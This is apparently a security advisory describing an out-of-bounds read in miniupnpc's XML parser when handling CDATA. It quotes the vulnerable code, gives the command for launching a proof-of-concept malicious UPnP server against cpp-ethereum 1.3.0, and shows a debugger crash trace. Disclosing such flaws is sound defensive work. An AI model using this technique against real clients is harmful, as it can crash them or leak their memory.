Description:

When miniupnpc parses a xml, it fails to check the end of the xml buffer, which could lead to read out of bounds of the buffer.
This can cause DOS or information leak.

In function

void parseelt(struct xmlparser * p):


					if(memcmp(p->xml, "<![CDATA[", 9) == 0)		// (1)  Failed to do bound check prior to "memcmp" here
					{
						/* CDATA handling */
						p->xml += 9;
						data = p->xml;
						i = 0;
						while(memcmp(p->xml, "]]>", 3) != 0)


To test:

The poc was tested on windows 10 64-bits.

First start the malicious upnp server:

python poc.py --listen 127.0.0.1:65000 --target havoc


1. For cpp-ethereum 1.3.0


1.1 Enable page heap for cpp-ethereum:

The page heap helps to crash the client immediately when oob read occurs.

1.1.1 Install Windbg x64

1.1.2 Execute the following command to enable page heap for eth.exe:

"c:\Program Files\Debugging Tools for Windows (x64)\gflags.exe" /i eth.exe +hpa


1.2 Start eth to observe the crash:

C:\Users\test>C:\cpp-ethereum\cpp-ethereum\build64\eth\Release\eth.exe

Crash Info:

(c60.41b4): Access violation - code c0000005 (!!! second chance !!!)
VCRUNTIME140!memcmp+0x90:
00007ffa`6764c320 488b01          mov     rax,qword ptr [rcx] ds:000002aa`02afb000=????????????????
0:018> k
Child-SP          RetAddr           Call Site
000000f8`56ffeea8 00007ff6`65d9af8f VCRUNTIME140!memcmp+0x90 [f:\dd\vctools\crt\vcruntime\src\string\amd64\memcmp.asm @ 150]
000000f8`56ffeeb0 00007ff6`65d9abe3 eth!parsexml+0x3ff
000000f8`56ffef20 00007ff6`65d93b09 eth!parsexml+0x53
000000f8`56ffef50 00007ff6`65c15d46 eth!parserootdesc+0x89
000000f8`56ffeff0 00007ff6`65bf7378 eth!dev::p2p::UPnP::UPnP+0x236 [c:\cpp-ethereum\cpp-ethereum\libp2p\upnp.cpp @ 79]
000000f8`56fff300 00007ff6`65c0722c eth!dev::p2p::Network::traverseNAT+0x138 [c:\cpp-ethereum\cpp-ethereum\libp2p\network.cpp @ 183]
000000f8`56fff470 00007ff6`65c12a18 eth!dev::p2p::Host::determinePublic+0x71c [c:\cpp-ethereum\cpp-ethereum\libp2p\host.cpp @ 407]
000000f8`56fff8b0 00007ff6`65b87596 eth!dev::p2p::Host::startedWorking+0x208 [c:\cpp-ethereum\cpp-ethereum\libp2p\host.cpp @ 751]
000000f8`56fffa20 00007ff6`65b87917 eth!dev::validateFieldNames+0x5f6
000000f8`56fffc50 00007ff6`65aa37e9 eth!dev::validateFieldNames+0x977
000000f8`56fffc90 00007ffa`69d7dc05 eth!std::_Pad::_Call_func+0x9
000000f8`56fffcc0 00007ffa`6b921fe4 ucrtbase!thread_start<unsigned int (__cdecl*)(void * __ptr64)>+0x35
000000f8`56fffcf0 00007ffa`6d7bf061 KERNEL32!BaseThreadInitThunk+0x14
000000f8`56fffd20 00000000`00000000 ntdll!RtlUserThreadStart+0x21




Special Thanks:

I'd like to thank to "tintinweb" for his excellent work on CVE-2017-8798:


https://github.com/tintinweb/pub/tree/master/pocs/cve-2017-8798


I heavily reused his poc code in this poc